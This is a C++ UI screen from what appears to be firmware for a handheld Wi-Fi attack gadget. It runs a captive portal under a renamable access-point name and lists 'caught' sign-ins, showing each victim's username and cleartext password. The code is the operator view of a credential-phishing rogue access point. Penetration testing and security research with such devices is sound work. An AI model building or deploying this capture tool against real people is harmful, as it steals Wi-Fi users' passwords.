#include "CaptivePortalScreen.h"

#include <TFT_eSPI.h>

#include "../Theme.h"
#include "../UiTask.h"
#include "Keyboard.h"
#include "../../hw/Board.h"
#include "../../radio/CaptivePortal.h"
#include "../../storage/Settings.h"

namespace ui {

void CaptivePortalScreen::onEnter(TFT_eSPI& tft) {
    tft.fillScreen(theme::palette().bg);
    theme::drawHeader(tft, "Captive Portal");
    // Pull the last AP name out of NVS.
    ssid_ = storage::get().portalSsid;
    restartPortal();
    dirty();
}

void CaptivePortalScreen::restartPortal() {
    radio::captive::stop();
    radio::captive::start(ssid_);
}

void CaptivePortalScreen::onExit(TFT_eSPI&) {
    radio::captive::stop();
}

bool CaptivePortalScreen::onEvent(const input::Event& e) {
    using input::EventType; using input::Key;

    // Tap the SSID banner (y≈36..64) → keyboard to rename the AP.
    if (e.type == EventType::TouchDown && e.y >= 36 && e.y <= 68) {
        CaptivePortalScreen* self = this;
        push(new Keyboard("Portal SSID:", ssid_, [self](const String* t) {
            if (t && t->length()) {
                self->ssid_ = *t;
                auto& s = storage::mut();
                s.portalSsid = *t;
                storage::save();
                self->restartPortal();
            }
            self->dirty();
        }, /*mask=*/false));
        return true;
    }

    if (e.type != EventType::KeyDown && e.type != EventType::KeyRepeat) return false;

    int n = radio::captive::submissionCount();
    constexpr int VISIBLE = 6;
    switch (e.key) {
        case Key::Left:
            if (e.type == EventType::KeyDown) pop();
            return true;
        case Key::Up:
            if (n) {
                cursor_ = (cursor_ - 1 + n) % n;
                if (cursor_ < scrollTop_) scrollTop_ = cursor_;
                if (cursor_ >= scrollTop_ + VISIBLE)
                    scrollTop_ = cursor_ - VISIBLE + 1;
                dirty();
            }
            return true;
        case Key::Down:
            if (n) {
                cursor_ = (cursor_ + 1) % n;
                if (cursor_ < scrollTop_) scrollTop_ = cursor_;
                if (cursor_ >= scrollTop_ + VISIBLE)
                    scrollTop_ = cursor_ - VISIBLE + 1;
                dirty();
            }
            return true;
        default:
            return false;
    }
}

void CaptivePortalScreen::onTick(uint32_t /*nowMs*/) {
    int c = radio::captive::clientCount();
    int s = radio::captive::submissionCount();
    if (c != lastClients_ || s != lastSubs_) {
        lastClients_ = c; lastSubs_ = s;
        // New capture lands — scroll to it so the operator sees it.
        if (s > 0) {
            cursor_ = s - 1;
            if (cursor_ >= scrollTop_ + 6) scrollTop_ = cursor_ - 5;
        }
        dirty();
    }
    // No time-based repaint: the 1 Hz "ago" refresh was causing a full
    // screen flicker and wiping out any transient overlays (like the
    // touch-debug dots). The relative-timestamp text will update
    // whenever the submission count changes, which is sufficient.
}

void CaptivePortalScreen::onRender(TFT_eSPI& tft) {
    const auto& pal = theme::palette();
    tft.fillRect(0, 34, 240, 266, pal.bg);

    // Tappable SSID box.
    tft.fillRect(2, 36, 236, 28, pal.fieldBg);
    tft.drawRect(2, 36, 236, 28, pal.accent);
    tft.setTextFont(2);
    tft.setTextColor(pal.accent, pal.fieldBg);
    tft.setCursor(8, 42);
    String s = ssid_;
    if (s.length() > 22) s = s.substring(0, 22) + "…";
    tft.printf("AP: %s", s.c_str());
    tft.setTextFont(1);
    tft.setTextColor(pal.textDim, pal.fieldBg);
    tft.setCursor(180, 46);
    tft.print("tap to edit");
    tft.setTextFont(2);

    tft.setTextColor(pal.textDim, pal.bg);
    tft.setCursor(8, 70);
    tft.printf("clients:%d  caught:%d",
               radio::captive::clientCount(),
               radio::captive::submissionCount());

    // Scrollable list of every captured submission. Each entry shows:
    //   - time since capture (relative to "now"), e.g. "37s"
    //   - user (truncated)
    //   - password (cleartext, truncated)
    int n = radio::captive::submissionCount();
    constexpr int ROW_H  = 36;
    constexpr int LIST_Y = 94;
    constexpr int VISIBLE = 5;

    if (n == 0) {
        tft.setTextColor(pal.textDim, pal.bg);
        tft.setCursor(8, LIST_Y + 20);
        tft.print("waiting for sign-ins…");
    } else {
        uint32_t now = millis();
        for (int vi = 0; vi < VISIBLE; ++vi) {
            int i = scrollTop_ + vi;
            if (i >= n) break;
            auto s = radio::captive::submissionAt(i);

            int y = LIST_Y + vi * ROW_H;
            bool sel = (i == cursor_);
            uint16_t bg = sel ? pal.selBg : pal.bg;
            uint16_t fg = sel ? pal.selFg : pal.textDim;
            tft.fillRect(0, y, 240, ROW_H - 2, bg);

            // Relative timestamp top-right.
            uint32_t ago = (now - s.ms) / 1000;
            char tbuf[16];
            if (ago < 60)        snprintf(tbuf, sizeof(tbuf), "%lus", (unsigned long)ago);
            else if (ago < 3600) snprintf(tbuf, sizeof(tbuf), "%lum", (unsigned long)(ago/60));
            else                 snprintf(tbuf, sizeof(tbuf), "%luh", (unsigned long)(ago/3600));

            tft.setTextFont(1);
            tft.setTextColor(sel ? TFT_YELLOW : pal.textDim, bg);
            int tw = tft.textWidth(tbuf);
            tft.setCursor(240 - tw - 4, y + 2);
            tft.print(tbuf);

            String u = s.user; if (u.length() > 26) u = u.substring(0, 26) + "…";
            String p = s.pass; if (p.length() > 26) p = p.substring(0, 26) + "…";

            tft.setTextFont(2);
            tft.setTextColor(fg, bg);
            tft.setCursor(4, y + 2);
            tft.printf("u: %s", u.c_str());
            tft.setCursor(4, y + 18);
            tft.printf("p: %s", p.c_str());
        }
    }

    theme::drawSdWarningIfMissing(tft);
    theme::drawFooter(tft, "U/D=scroll  LEFT=stop+back");
}

} // namespace ui
